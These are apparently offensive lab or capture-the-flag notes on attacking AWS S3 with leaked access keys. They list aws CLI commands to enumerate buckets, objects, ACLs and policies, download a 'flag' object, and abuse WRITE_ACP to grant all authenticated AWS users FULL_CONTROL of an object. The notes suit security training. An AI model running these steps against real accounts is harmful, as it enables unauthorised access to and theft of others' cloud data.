Access key = long term creds for IAM or root account  
with access and secret key:  

### List S3 buckets.
`aws s3api list-buckets`  

### Check bucket location.  
Command: `aws s3api get-bucket-location --bucket data-extractor-repo`  

### Enumerate bucket objects  
Commands:  
`aws s3api list-objects-v2 --bucket data-extractor-repo`  
`aws s3api list-objects --bucket file-uploader-saved-files`  
`aws s3 ls s3://s3-file-load-138431686808`  

### Check object versions.
Command: `aws s3api list-object-versions --bucket data-extractor-repo`  

### Check bucket ACLs and objects ACLs.  
Commands:  
`aws s3api get-bucket-acl --bucket file-uploader-saved-files`  
`aws s3api get-object-acl --bucket file-uploader-saved-files --key flag`  
## Abuse ACL (WRITE_ACP) on object EG you can list object but not copy/download.
`aws s3api get-object-acl --bucket <bucekt-name> --key flag > objacl.json`
we see we have WRITE_ACP: `"Permission": "WRITE_ACP"`
We can add below in file (Make sure to modify the Owner’s displayName and ID according to the Object ACL you retrieved):
```        
{
            "Grantee": {
                "Type": "Group",
                "URI": "http://acs.amazonaws.com/groups/global/AuthenticatedUsers"
            },
            "Permission": "FULL_CONTROL"
        }
```
And now reopload the policy:
`aws s3api put-object-acl --bucket s3-secret-771616743370 --key flag --access-control-policy file://objacl.json`  



### Download objects from the S3 bucket.
Commands:
`aws s3 cp s3://file-uploader-saved-files/flag`  

### Get bucket policy and beautify the output.
Command: `aws s3api get-bucket-policy --bucket insecurecorp-code --output text | python -m json.tool`  

### Check the public access block for a bucket.
Command: aws s3api get-public-access-block --bucket data-extractor-repo

### Check if a static website is available in the browser.  
URL: `<bucket-name>.s3-website-<region>.amazonaws.com`  
(Can also run `ls` unauthed as well as trying to upload with your own keys`

AWS CLI (https://docs.aws.amazon.com/cli/latest/reference/)
